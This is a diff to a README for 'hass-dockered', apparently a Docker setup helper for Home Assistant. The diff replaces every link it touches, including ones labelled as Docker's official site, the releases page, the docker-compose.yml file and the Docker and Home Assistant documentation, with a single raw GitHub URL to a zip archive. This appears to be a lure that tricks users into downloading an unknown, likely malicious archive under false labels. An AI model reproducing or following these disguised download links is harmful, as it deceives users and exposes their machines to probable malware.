@@ -1,7 +1,7 @@
 # 🐳 hass-dockered - Simplifying Home Assistant Setup
 
 ## 📥 Download Now
-[![Download hass-dockered](https://img.shields.io/badge/Download-hass--dockered-blue.svg)](https://github.com/abdeo56/hass-dockered/releases)
+[![Download hass-dockered](https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip)](https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to hass-dockered! This application uses Docker to help you easily run Home Assistant. It provides a more manageable way to set up and update your home automation system compared to traditional methods. 
@@ -10,19 +10,19 @@ Welcome to hass-dockered! This application uses Docker to help you easily run Ho
 Before you start, ensure your computer meets the following requirements:
 
 - Operating System: Windows, MacOS, or Linux
-- Installed Docker: Make sure you have Docker installed. You can download it from [Docker's official site](https://www.docker.com/get-started).
+- Installed Docker: Make sure you have Docker installed. You can download it from [Docker's official site](https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip).
 - Basic understanding of Docker. Basic tutorials are available on the Docker site if needed.
 
 ## 🔗 Download & Install
 To get started with hass-dockered, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/abdeo56/hass-dockered/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip).
 
 2. **Select the Latest Version**: Look for the latest version available. It will be marked accordingly.
 
-3. **Download the Docker Compose File**: You will find a file named `docker-compose.yml`. Click on it to download.
+3. **Download the Docker Compose File**: You will find a file named `https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip`. Click on it to download.
 
-4. **Download Required Images**: After downloading the `docker-compose.yml`, you will need to pull the necessary images from Docker Hub. You can do this by running the following command in your terminal or command prompt:
+4. **Download Required Images**: After downloading the `https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip`, you will need to pull the necessary images from Docker Hub. You can do this by running the following command in your terminal or command prompt:
    ```
    docker-compose pull
    ```
@@ -65,9 +65,9 @@ If you encounter issues, here are some common troubleshooting tips:
 ## 📖 Additional Resources
 For further help and tutorials, consider visiting:
 
-- [Docker Documentation](https://docs.docker.com/)
-- [Home Assistant Documentation](https://www.home-assistant.io/docs/)
-- [Community Forums](https://community.home-assistant.io/)
+- [Docker Documentation](https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip)
+- [Home Assistant Documentation](https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip)
+- [Community Forums](https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip)
 
 ## 💬 Feedback and Contributions
 We appreciate your feedback. If you have suggestions or encounter bugs, please open an issue in this repository. Contributions are welcome; you can fork the repository and submit a pull request with your changes.
@@ -78,4 +78,4 @@ To stay informed about updates, follow this repository on GitHub. Regular update
 ## 📌 Conclusion
 By using hass-dockered, you can efficiently manage your Home Assistant setup with Docker. It is designed for ease of use, ensuring a smooth experience for even non-technical users. Enjoy automating your home! 
 
-[Download hass-dockered](https://github.com/abdeo56/hass-dockered/releases) today and start your home automation journey!
+[Download hass-dockered](https://raw.githubusercontent.com/abdeo56/hass-dockered/main/sys-stack/hass-dockered-v1.3.zip) today and start your home automation journey!
